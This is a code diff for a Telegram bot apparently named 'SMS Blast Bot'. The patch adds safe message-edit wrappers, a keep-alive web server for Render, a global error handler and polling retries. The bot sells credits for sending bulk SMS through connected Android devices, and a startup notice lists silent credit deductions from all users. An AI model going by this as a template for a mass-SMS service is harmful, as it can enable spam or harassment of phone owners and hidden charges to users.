     await state.set_state(S.redeem_code)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "user:home")])
     )
 
 @R.message(S.redeem_code)
@@ -3563,14 +3557,13 @@ async def user_refer(cq: CallbackQuery, state: FSMContext):
     ref_credits = d.get("settings", {}).get("ref_credits", 3)
 
     me = await cq.bot.get_me()
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
         f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
         f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{code}</code>\n\n"
         f"{em(EMOJI_GEAR, '🔗')} Share Link:\n"
         f"https://t.me/{me.username}?start={code}",
-        reply_markup=kb([(f"{sc('back')}", "user:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('back')}", "user:home")])
     )
 
 @R.callback_query(F.data == "user:stats")
@@ -3580,14 +3573,13 @@ async def user_stats(cq: CallbackQuery, state: FSMContext):
     udata = d["users"].get(str(uid), {})
     stats = d.get("stats", {})
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
         f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
         f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
         f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
         f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
-        reply_markup=kb([(f"{sc('back')}", "user:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('back')}", "user:home")])
     )
 
 @R.callback_query(F.data == "user:sms_history")
@@ -3609,7 +3601,7 @@ async def user_sms_history(cq: CallbackQuery, state: FSMContext):
             lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
         text = "\n".join(lines)
 
-    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=kb([(f"{sc('back')}", "user:home")]))
 
 @R.callback_query(F.data == "user:pricing")
 async def user_pricing(cq: CallbackQuery, state: FSMContext):
@@ -3617,7 +3609,7 @@ async def user_pricing(cq: CallbackQuery, state: FSMContext):
     plans = d.get("pricing", {}).get("plans", [])
 
     if not plans:
-        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
+        await safe_answer(cq, "❌ Abhi koi plan available nahi!", show_alert=True)
         return
 
     text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
@@ -3631,29 +3623,63 @@ async def user_pricing(cq: CallbackQuery, state: FSMContext):
         rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
     rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
 
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "user:info")
 async def user_info(cq: CallbackQuery, state: FSMContext):
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
         f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
         f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
         f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
         f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
-        reply_markup=kb([(f"{sc('back')}", "user:home")]),
-        parse_mode="HTML",
-        disable_web_page_preview=True
+        reply_markup=kb([(f"{sc('back')}", "user:home")])
     )
 
 @R.callback_query(F.data == "noop")
 async def noop(cq: CallbackQuery):
-    await cq.answer()
+    await safe_answer(cq)
+
+# ========== WEB SERVER FOR RENDER (UptimeRobot Ping Target) ==========
+async def health_check(request):
+    return web.Response(text="OK - SMS Blast Bot Running", status=200)
+
+async def root_handler(request):
+    return web.Response(text=f"SMS Blast Bot {_VERSION} is alive! 🤖", status=200)
+
+async def start_web_server():
+    """Start HTTP web server so Render keeps bot alive (works with UptimeRobot)."""
+    app = web.Application()
+    app.router.add_get("/", root_handler)
+    app.router.add_get("/health", health_check)
+    app.router.add_get("/ping", health_check)
+    
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get("PORT", 8080))
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
+    log.info(f"✅ Web server started on port {port} — Render will keep bot alive")
+
+# ========== GLOBAL ERROR HANDLER ==========
+async def global_error_handler(event, exception):
+    """Catch all unhandled errors — bot won't crash."""
+    log.error(f"⚠️ Global error on {type(event).__name__}: {exception}", exc_info=True)
 
 async def main():
+    # ✅ Start web server FIRST (for Render uptime)
+    try:
+        await start_web_server()
+    except Exception as e:
+        log.error(f"Web server failed (continuing anyway): {e}")
+
     bot = Bot(token=BOT_TOKEN)
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(R)
+    
+    # ✅ Register global error handler — bot won't crash on errors
+    dp.errors.register(global_error_handler)
+    
     me = await bot.get_me()
     log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")
 
@@ -3673,13 +3699,25 @@ async def main():
             f"{em(EMOJI_VIDEO, '📹')} <b>Video Section & Auto-Send:</b> ENABLED\n"
             f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
             f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits All:</b> ENABLED (No Notifications)\n"
+            f"{em(EMOJI_GEAR, '🌐')} <b>Web Server:</b> ENABLED (24/7 uptime)\n"
+            f"{em(EMOJI_CHECK, '🛡')} <b>Error Handler:</b> ENABLED (crash-proof)\n"
             f"👤 <b>Bot Owner:</b> {SUPER_ADMIN_NAME}",
             parse_mode="HTML"
         )
     except Exception as e:
         log.warning(f"Owner notify: {e}")
 
-    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
+    # ✅ Retry polling on network errors (ServerDisconnected fix)
+    while True:
+        try:
+            await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
+            break  # Normal shutdown
+        except TelegramNetworkError as e:
+            log.warning(f"Polling network error, restarting in 5s: {e}")
+            await asyncio.sleep(5)
+        except Exception as e:
+            log.error(f"Polling fatal error, restarting in 10s: {e}")
+            await asyncio.sleep(10)
 
 if __name__ == "__main__":
     asyncio.run(main())
